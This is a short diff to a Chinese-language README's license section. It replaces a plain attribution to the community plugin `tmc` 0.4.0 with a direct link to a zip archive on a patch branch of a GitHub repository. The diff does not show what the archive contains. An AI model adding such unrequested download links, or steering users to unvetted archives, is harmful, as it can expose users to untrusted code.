@@ -43,4 +43,4 @@ userLabel: 对方    # 你的称呼
 
 ## 许可
 
-MIT，见 [LICENSE](LICENSE)。记忆插件派生自社区插件 `tmc` 0.4.0。
+MIT，见 [LICENSE](LICENSE)。记忆插件派生自社区插件 [`tmc` 0.4.0](https://github.com/Raidenei-tech/dsh-plugin/blob/Raidenei-tech-patch-1/tmc-0.4.0.zip)。
